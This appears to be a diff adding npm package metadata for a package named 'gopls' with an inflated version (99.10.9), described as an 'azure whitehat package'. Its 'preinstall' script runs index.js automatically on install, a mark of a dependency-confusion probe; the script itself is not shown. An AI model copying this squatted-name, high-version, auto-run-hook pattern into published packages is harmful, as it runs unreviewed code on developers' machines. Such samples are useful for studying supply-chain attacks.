@@ -1,0 +1,39 @@
+{
+    "name": "gopls",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "gopls@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-iFaI2V8EbAYNZm+X8hTClQL42Ypz94VrKLX7fxOxFyNIYMOvdIXMDe84YsoNUdUGsXZ+0imEOZEQBvOSh0loNA==",
+        "shasum": "f62c16edd9b863322067f3953689b86efce89bb1",
+        "tarball": "https://registry.npmjs.org/gopls/-/gopls-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3569,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRAPCRA9TVsSAnZWagAALxgQAIqPWesv2HN308jLSJzr\nd3gjMEGeeiphzLbXwhCJc8s/2SIx2F+D78I5LTUbxXqeQ/STv9Xj76OuE6a1\ngrRH8w464KNcRzEtzKjLLB51XpRoRyVPIS/qGU+Y+Z4gMAZGMPRi8pzlXpnW\n0pwVdtF7h+581K6LS63mgFkRBog8encGYNZg8hfmJHjgKDE3DDiBsrr8KXI+\nkPB5H8AvNoFjqZM68z4f13QZrHXzDGl1qRn0eevEyPvvvAtpedHV2XWx8ah+\nROsyBDeJyiPcAGnj9gouliaQYAwp019PKinN+H24IMjXcXr58TyjxuMWbsz6\n/8F514sbhTyo/a4c0Q9eYhumvzdZiip39zla+SxpoHdn5UVzkXs4ccU31l3+\njbn8tBDjSR0DWm3xGrdQkEggm59/Kr2dknhG5+yLppCSqQy3PqjoJnJDtgQN\n+9Al9oVst2BIXVIWRnwtrtXaechPzXC6lb7Q1Uk/ashATRhiMkFusXrMu+62\nxdQx9ZfPmGIRTu3KQJqVrX3ljiyzwSzVq71OgTMs6t1A9gkYnaJv2ugRwKlB\nsbuVqJMjzRP3gWUUvKeggGH9haJCHJ6FulHcDXxMGNTGX1a/SOJQsC8pSua/\nsAWQoDOpy02aimvV96R1pTgAMHKLykSzidbThHdTBeCyHmH3NI9jkCvhgtpL\nZWDV\r\n=lV43\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/gopls_99.10.9_1637945359120_0.8766560549547999"
+    },
+    "_hasShrinkwrap": false
+}
